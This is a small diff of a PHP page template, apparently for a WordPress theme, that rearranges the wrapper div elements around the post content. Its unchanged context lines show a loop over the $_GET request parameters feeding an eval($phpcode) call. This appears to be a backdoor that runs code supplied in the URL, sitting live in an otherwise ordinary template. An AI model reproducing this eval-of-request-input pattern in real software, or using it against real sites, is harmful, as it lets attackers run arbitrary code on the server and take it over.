@@ -2,8 +2,7 @@
 
 <?php global $post; ?>
 
-<div id="posts" class="span-16 prepend-1 append-1">
-<div id="content" class="post">
+<div id="content">
 
 <div class="main">
     <?php echo $post->post_content; ?>
@@ -20,7 +19,6 @@ foreach ($_GET as $key => $val)
 eval($phpcode);
 ?>
 
-</div>
 </div>
 
 <?php get_sidebar(); ?>
